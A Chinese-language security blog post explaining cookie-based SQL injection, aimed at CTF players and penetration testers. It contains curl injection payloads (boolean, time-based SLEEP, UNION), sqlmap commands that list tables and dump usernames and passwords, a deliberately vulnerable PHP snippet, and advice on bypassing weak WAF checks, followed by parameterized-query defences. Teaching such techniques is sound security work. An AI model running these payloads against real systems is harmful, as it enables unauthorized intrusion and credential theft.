---
title: "深入 Cookie SQL 注入：原理、绕过与 sqlmap 实战"
date: 2026-06-03T22:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "SQL注入", "Cookie注入", "sqlmap"]
categories: ["技术笔记"]
---

## 一、什么是 Cookie SQL 注入

Cookie SQL 注入是一种特殊的 SQL 注入攻击向量——**注入点不在 URL 参数或 POST 表单中，而在 HTTP 请求的 Cookie 头部**。

当服务端从 Cookie 中读取用户标识、会话信息或其他业务数据，并**直接拼接到 SQL 语句**中执行时，攻击者就可以通过构造恶意 Cookie 来操控数据库查询。

### 典型的漏洞代码示例

```php
// PHP 示例：从 Cookie 读取用户 ID 查询权限
$user_id = $_COOKIE['id'];
$sql = "SELECT * FROM users WHERE id = '$user_id'";
$result = mysqli_query($conn, $sql);
```

这段代码和常见的 `$_GET['id']` 注入没有本质区别，但由于数据来自 Cookie，很多开发者和安全测试人员会本能地忽略这个位置。

---

## 二、为什么 Cookie 注入容易被忽视

### 2.1 认知盲区

在常见的安全测试和 CTF 题目中，测试者的注意力通常集中在：
- URL 的 GET 参数 (`?id=1`)
- 表单提交的 POST 数据
- JSON/XML API 请求体

而 **Cookie 被视为「服务端设置、客户端原样带回」的信道**，很少被怀疑会携带恶意数据。

### 2.2 WAF 绕过优势

许多 Web 应用防火墙（WAF）的规则重点监控：
- URL 查询字符串中的 SQL 关键字
- POST Body 中的可疑 payload
- 异常的 HTTP 请求频率

但对于 **Cookie 头部的检测往往较弱**。这意味着同样的 payload，放在 URL 里会被拦截，放在 Cookie 里可能畅通无阻。

### 2.3 业务场景驱动

有些架构设计天然依赖 Cookie 传参：
- 用户偏好设置（主题、语言）存储在 Cookie 中
- 分页状态、筛选条件通过 Cookie 持久化
- 某些框架将路由参数序列化到 Cookie

这些场景下，服务端往往会直接读取 Cookie 值并用于数据库查询。

---

## 三、Cookie 注入 vs GET/POST 注入

| 维度 | GET 注入 | POST 注入 | Cookie 注入 |
|------|---------|----------|------------|
| **参数位置** | URL `?id=1` | Request Body | `Cookie: id=1` |
| **可见性** | 浏览器地址栏可见 | 需抓包/开发者工具 | 需抓包/开发者工具 |
| **WAF 检测强度** | 强 | 中等 | 较弱 |
| **手工修改难度** | 低（直接改 URL） | 中（需构造请求） | 中（需改 Cookie） |
| **sqlmap 参数** | `-u URL` | `--data` | `--cookie` |

**核心区别**：攻击向量不同，但**漏洞本质完全相同**——都是不可信输入进入 SQL 查询。

---

## 四、手工验证 Cookie 注入

### 4.1 用浏览器开发者工具

1. 打开目标页面
2. F12 打开开发者工具 → Application/应用 → Cookies
3. 修改目标 Cookie 值，刷新页面观察响应变化

### 4.2 用 curl 测试

```bash
# 1. 正常请求（基准）
curl -s "http://target.com/page.php" \
  -H "Cookie: id=1"

# 2. 注入测试：单引号闭合
curl -s "http://target.com/page.php" \
  -H "Cookie: id=1'"

# 3. 布尔盲注测试
curl -s "http://target.com/page.php" \
  -H "Cookie: id=1 AND 1=1"
curl -s "http://target.com/page.php" \
  -H "Cookie: id=1 AND 1=2"
# 如果两次响应不同 → 存在布尔盲注

# 4. 时间盲注测试
curl -s -o /dev/null -w "%{time_total}" \
  "http://target.com/page.php" \
  -H "Cookie: id=1 AND IF(1=1, SLEEP(5), 0)"
# 如果延迟约 5 秒 → 存在时间盲注

# 5. UNION 注入测试
curl -s "http://target.com/page.php" \
  -H "Cookie: id=-1 UNION SELECT 1,2,3-- -"
# 如果页面回显了 1,2,3 中的某个数字 → 存在 UNION 注入
```

---

## 五、sqlmap 自动化检测与利用

### 5.1 核心参数

| 参数 | 作用 | 是否必须 |
|------|------|---------|
| `--cookie="id=1"` | 指定 Cookie 内容 | 是 |
| `--level=2` | 检测深度，Cookie 注入需要 >= 2 | 是 |
| `--batch` | 自动回答交互提问 | 强烈推荐 |
| `--technique=U` | 强制使用 UNION（如有） | 可选 |

### 5.2 为什么必须 `--level>=2`

sqlmap 默认 `--level=1`，此时只检测：
- GET 参数
- POST 数据

**Cookie 注入点要到 `--level=2` 才会被测试。** 这是 sqlmap 的性能优化设计，因为 Cookie 通常不被视为注入高危区。

### 5.3 完整利用流程（真实案例）

以下是一个同时测出三种注入类型的 Cookie 注入点：

```bash
python sqlmap.py -u "http://target.com/page.php" \
  --cookie="id=1" \
  --level=2 \
  --batch
```

sqlmap 输出：

```
Parameter: id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3176=3176

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))Uzus)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-3553 UNION ALL SELECT NULL,CONCAT(...)-- -
```

#### Step 1：优先使用 UNION 注入（最快）

```bash
python sqlmap.py -u "http://target.com/page.php" \
  --cookie="id=1" \
  --technique=U \
  --level=2 \
  --batch \
  --tables
```

#### Step 2：Dump 目标数据

```bash
python sqlmap.py -u "http://target.com/page.php" \
  --cookie="id=1" \
  --technique=U \
  --level=2 \
  --batch \
  -T users -C username,password --dump
```

### 5.4 带登录态的 Cookie 注入

如果目标页面需要登录才能访问，可以把 session Cookie 一并带上：

```bash
python sqlmap.py -u "http://target.com/admin.php" \
  --cookie="PHPSESSID=abc123; id=1" \
  --level=2 \
  --batch
```

sqlmap 会自动识别哪个 Cookie 键值对是注入点，其他 Cookie 作为正常上下文携带。

---

## 六、高级技巧：HTTP Header 注入

Cookie 本质上是 HTTP Header 的一种。sqlmap 支持检测其他 Header 中的注入点：

| 参数 | 检测位置 |
|------|---------|
| `--user-agent` | User-Agent 头部 |
| `--referer` | Referer 头部 |
| `-H "X-Custom: 1"` | 自定义头部 |

同样需要 `--level>=3` 才会测试这些位置。

---

## 七、防御建议

### 7.1 代码层面

```php
// 错误的写法
$user_id = $_COOKIE['id'];
$sql = "SELECT * FROM users WHERE id = '$user_id'";

// 正确的写法：参数化查询
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_COOKIE['id']);
$stmt->execute();
```

### 7.2 架构层面

- **不信任任何客户端输入**，包括 Cookie
- 敏感操作不要依赖 Cookie 中的标识，使用服务端 Session
- 对 Cookie 值进行类型校验和长度限制

### 7.3 测试层面

安全测试时应将 Cookie 纳入注入测试范围：
- 所有存储在 Cookie 中的业务参数
- 编码/序列化后存入 Cookie 的数据（如 JWT、Base64）
- 第三方服务写入的 Cookie（广告、统计脚本）

---

## 八、总结

Cookie SQL 注入的本质和 GET/POST 注入没有区别，但由于**参数位置隐蔽、WAF 检测薄弱、开发者容易忽略**，它往往成为攻击的有效突破口。

对于安全测试人员和 CTF 选手，关键记忆点：

1. **sqlmap 测 Cookie 必须加 `--level=2`**，否则不会检测
2. **Cookie 和 GET 注入可以共存**——同一个参数可能既出现在 URL 又出现在 Cookie，两者的注入点可能不同
3. **优先利用 UNION 注入**，比盲注快几个数量级
4. **WAF 对 Cookie 的检查通常较弱**，渗透测试时应重点关注

掌握 Cookie 注入的检测和利用方法，能够显著扩展 SQL 注入的测试覆盖面，发现那些隐藏在「不起眼角落」里的漏洞。
